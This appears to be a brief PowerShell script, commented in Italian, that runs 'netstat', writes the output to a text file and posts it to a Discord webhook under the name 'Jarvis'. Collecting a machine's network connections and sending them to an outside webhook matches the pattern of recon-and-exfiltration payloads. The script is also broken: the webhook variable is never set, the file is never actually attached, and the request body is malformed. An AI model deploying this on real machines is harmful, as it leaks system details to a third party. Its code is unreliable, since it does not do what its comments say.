# Imposta le variabili
$command = "netstat"
$message = "Risultato del comando: $command"
$fileName = "netstat.txt"

# Esegue il comando
$output = Invoke-Expression $command

# Salva il risultato in un file txt
$output | Out-File $fileName

# Invia il file tramite Discord
Invoke-RestMethod -ContentType 'application/json' -Method POST -Uri $webhook -Body @{
    'username' = 'Jarvis'
    'content' = "File allegato: $fileName"
    'file' = $fileName
}
